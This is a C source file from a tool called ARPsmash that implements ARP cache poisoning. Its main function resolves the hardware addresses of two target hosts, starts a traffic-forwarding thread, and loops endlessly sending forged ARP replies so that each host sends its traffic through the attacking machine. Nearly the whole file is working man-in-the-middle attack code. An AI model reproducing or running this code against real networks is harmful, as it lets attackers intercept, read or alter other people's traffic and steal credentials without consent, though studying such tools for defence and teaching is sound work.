/*
 * ARPsmash/arper.c
 *
 * (C) 2007,2009, BlackLight <blacklight@autistici.org>
 *
 *		This program is free software; you can redistribute it and/or
 *		modify it under the terms of the GNU General Public License
 *		as published by the Free Software Foundation; either version
 *		3 of the License, or (at your option) any later version.
 */

#include "arpsmash.h"

/**
 * @brief Main function. It makes the poisoning loop
 * @return Nothing if successful, a value < 0 in case of error
 */
int doarp()  {
	int ip4addr;
	struct arp_hdr arp;
	
	pthread_t th,th_forward;
	__u8 *hw;
	t_hw=NULL;

	if ((sd=socket(PF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP)))<0)  {
		fprintf (stderr,"%s***Socket error: %s%s\n", RED, strerror(errno), NORMAL);
		return -1;
	}

	dlink.sll_family=AF_PACKET;
	dlink.sll_protocol=htons(ETH_P_ARP);
	dlink.sll_ifindex=ifindex((char*) ifc);
	dlink.sll_halen=ETH_ALEN;
	memset (dlink.sll_addr,0xFF,ETH_ALEN);

	if (bind(sd, (struct sockaddr*) &dlink, sizeof(dlink))<0)  {
		fprintf (stderr,"%s***Bind error: %s%s\n", RED, strerror(errno), NORMAL);
		return -2;
	}

	arp.hw_format=htons(ARPHRD_ETHER);
	arp.prot_format=htons(ETH_P_IP);
	arp.hw_len=ETH_ALEN;
	arp.prot_len=4;
	arp.opcode=htons(ARPOP_REQUEST);

	ip4addr=inet_addr(get_ipv4_addr((char*) ifc));
	memcpy (arp.ip_sender, (__u8*) &ip4addr, sizeof(arp.ip_sender));

	hw=get_hw_addr((char*) ifc);
	memcpy (arp.hw_sender, (__u8*) hw, sizeof(arp.hw_sender));
	memset (arp.hw_target, 0xFF, sizeof(arp.hw_target));

	memcpy (arp.ip_target, (__u8*) &ip4addr, sizeof(ip4addr));

	ip4addr=inet_addr((char*) t1);
	memcpy (arp.ip_target, (__u8*) &ip4addr, sizeof(ip4addr));
	
	if (sendto(sd, &arp, sizeof(arp), 0, (struct sockaddr*) &dlink, sizeof(dlink))<0)  {
		fprintf (stderr,"\t%s***Error in sendto: %s%s\n", RED, strerror(errno), NORMAL);
		return -3;
	}

	signal(SIGUSR1,handle);
	pthread_create (&th,NULL,hw_addr,(void*) &ip4addr);
	sleep(TIMEOUT);
	
	if (!t_hw)  {
		fprintf (stderr,"\t%s***Error: Unable to get %s physical address: %s%s\n", RED, t1, strerror(errno), NORMAL);
		return -4;
	}

	t1_hw = (__u8*) malloc(ETH_ALEN);
	memcpy (t1_hw,t_hw,ETH_ALEN);
	printf ("\t%s*** Host %s is at %.2x:%.2x:%.2x:%.2x:%.2x:%.2x%s\n",
			CYAN,
			t1,
			t1_hw[0],
			t1_hw[1],
			t1_hw[2],
			t1_hw[3],
			t1_hw[4],
			t1_hw[5],
			NORMAL
	);

	ip4addr=inet_addr((char*) t2);
	memcpy (arp.ip_target, (__u8*) &ip4addr, sizeof(ip4addr));

	if (sendto(sd, &arp, sizeof(arp), 0, (struct sockaddr*) &dlink, sizeof(dlink))<0)  {
		fprintf (stderr,"%s\t*** Error in sendto: %s%s\n", RED, strerror(errno), NORMAL);
		return -5;
	}

	t_hw=NULL;
	pthread_create (&th, NULL, hw_addr, (void*) &ip4addr);
	sleep(TIMEOUT);

	if (!t_hw)  {
		fprintf (stderr,"\t%s***Error: Unable to get %s physical address: %s%s\n", RED, t2, strerror(errno), NORMAL);
		return -6;
	}

	t2_hw = (__u8*) malloc(ETH_ALEN);
	memcpy (t2_hw,t_hw,ETH_ALEN);
	printf ("\t%s*** Host %s is at %.2x:%.2x:%.2x:%.2x:%.2x:%.2x%s\n",
			CYAN,
			t2,
			t2_hw[0],
			t2_hw[1],
			t2_hw[2],
			t2_hw[3],
			t2_hw[4],
			t2_hw[5],
			NORMAL
			);

	pthread_create (&th_forward, NULL, forward, (void*) &dlink);
	signal(SIGINT,term);
	signal(SIGTERM,term);
	signal(SIGKILL,term);
	
	while(1)  {
		arp.opcode=htons(ARPOP_REPLY);
		memcpy (&arp.hw_sender, hw, ETH_ALEN);
		ip4addr=inet_addr((char*) t2);
		memcpy (arp.ip_sender, &ip4addr, 4);

		memcpy (&arp.hw_target, t1_hw, ETH_ALEN);
		ip4addr=inet_addr((char*) t1);
		memcpy (&arp.ip_target, &ip4addr, 4);

		if (sendto(sd, &arp, sizeof(arp), 0, (struct sockaddr*) &dlink, sizeof(dlink))<0)  {
			fprintf (stderr,"%s*** Error in sendto: %s%s\n", RED, strerror(errno), NORMAL);
			return -7;
		}

		ip4addr=inet_addr((char*) t1);
		memcpy (arp.ip_sender, &ip4addr, 4);

		memcpy (&arp.hw_target, t2_hw, ETH_ALEN);
		ip4addr=inet_addr((char*) t2);
		memcpy (&arp.ip_target, &ip4addr, 4);

		if (sendto(sd, &arp, sizeof(arp), 0, (struct sockaddr*) &dlink, sizeof(dlink))<0)  {
			fprintf (stderr,"%s*** Error in sendto: %s%s\n", RED, strerror(errno), NORMAL);
			return -8;
		}

		usleep(SEND_DELAY);
	}

	return 0;
}

/**
 * @brief This calls doarp() function initializating right values
 * @return Nothing if successful, a value < 0 in case of error
 */
int arpsmash (__u8* interface, __u8* addr1, __u8* addr2)  {
	ifc = (__u8*) strdup((char*) interface);
	
	if (!(t1=get_host_addr(addr1)))  {
		fprintf (stderr,"%s*** Error - Unable to resolve %s%s\n", RED, addr1, NORMAL);
		return -1;
	}

	if (!(t2=get_host_addr(addr2)))  {
		fprintf (stderr,"%s*** Error - Unable to resolve %s%s\n", RED, addr2, NORMAL);
		return -1;
	}

	if (doarp()<0)
		return -1;
	return 0;
}

